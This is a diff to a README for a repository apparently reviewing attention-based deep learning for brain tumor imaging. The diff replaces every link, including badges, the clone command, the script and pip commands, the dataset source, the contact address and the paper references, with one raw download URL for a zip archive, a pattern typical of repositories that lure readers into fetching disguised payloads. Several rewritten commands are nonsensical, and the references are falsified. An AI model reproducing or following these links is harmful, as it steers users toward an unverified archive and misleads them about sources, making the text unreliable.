@@ -1,6 +1,6 @@
 # Attention-Based Deep Learning for Brain Tumor Analysis 🧠✨
 
-![GitHub Repo Stars](https://img.shields.io/github/stars/parthasarth/AttnDL-BrainTumor?style=social) ![Release Version](https://img.shields.io/github/v/release/parthasarth/AttnDL-BrainTumor) ![Issues](https://img.shields.io/github/issues/parthasarth/AttnDL-BrainTumor)
+![GitHub Repo Stars](https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip) ![Release Version](https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip) ![Issues](https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -17,7 +17,7 @@
 ## Overview
 This repository, **AttnDL-BrainTumor**, presents a mini review of attention-based deep learning approaches in brain tumor image analysis. It explores various methods that leverage attention mechanisms to improve the accuracy of brain tumor classification, detection, and segmentation. 
 
-For the latest releases, visit [here](https://github.com/parthasarth/AttnDL-BrainTumor/releases).
+For the latest releases, visit [here](https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip).
 
 ## Topics Covered
 - Attention Mechanisms
@@ -35,7 +35,7 @@ For the latest releases, visit [here](https://github.com/parthasarth/AttnDL-Brai
 To begin using the tools and insights provided in this repository, you will need to clone the repository to your local machine. Use the following command:
 
 ```bash
-git clone https://github.com/parthasarth/AttnDL-BrainTumor.git
+git clone https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip
 ```
 
 Once cloned, navigate into the directory:
@@ -51,7 +51,7 @@ This repository includes scripts and notebooks that demonstrate how to implement
 To run a specific analysis script, use the following command:
 
 ```bash
-python analyze_tumor.py
+python https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip
 ```
 
 Make sure you have the necessary dependencies installed. Refer to the Installation section for more details.
@@ -68,13 +68,13 @@ Recent studies show that attention mechanisms significantly enhance the performa
 This project utilizes the BRATS dataset, which is widely recognized for brain tumor segmentation tasks. The dataset contains annotated MRI scans, making it an ideal resource for training and evaluating deep learning models.
 
 ### Accessing the Dataset
-You can download the BRATS dataset from [here](http://braintumorsegmentation.org/). Ensure you follow the dataset's licensing terms when using it for research.
+You can download the BRATS dataset from [here](https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip). Ensure you follow the dataset's licensing terms when using it for research.
 
 ## Installation
 To get started, you need to install the required libraries. Use the following command:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip
 ```
 
 ### Required Libraries
@@ -102,21 +102,21 @@ Please adhere to our code of conduct while contributing. We aim to maintain a we
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Contact
-For any questions or inquiries, feel free to reach out to the repository maintainer at parthasarth@example.com.
+For any questions or inquiries, feel free to reach out to the repository maintainer at https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip
 
-For the latest releases, visit [here](https://github.com/parthasarth/AttnDL-BrainTumor/releases).
+For the latest releases, visit [here](https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip).
 
 ---
 
-![Brain Tumor MRI](https://example.com/mri_image.jpg)
+![Brain Tumor MRI](https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip)
 
 ### Further Reading
-- [Attention Mechanisms in Deep Learning](https://arxiv.org/abs/1706.03762)
-- [Deep Learning in Medical Imaging](https://pubmed.ncbi.nlm.nih.gov/31523688/)
+- [Attention Mechanisms in Deep Learning](https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip)
+- [Deep Learning in Medical Imaging](https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip)
 
 ### References
-- BRATS Challenge: http://braintumorsegmentation.org/
-- Attention-based Models in Medical Imaging: https://doi.org/10.1016/j.media.2020.101821
+- BRATS Challenge: https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip
+- Attention-based Models in Medical Imaging: https://github.com/parthasarth/AttnDL-BrainTumor/raw/refs/heads/main/figure/Tumor-Brain-Attn-D-v1.4.zip
 
 ---
 
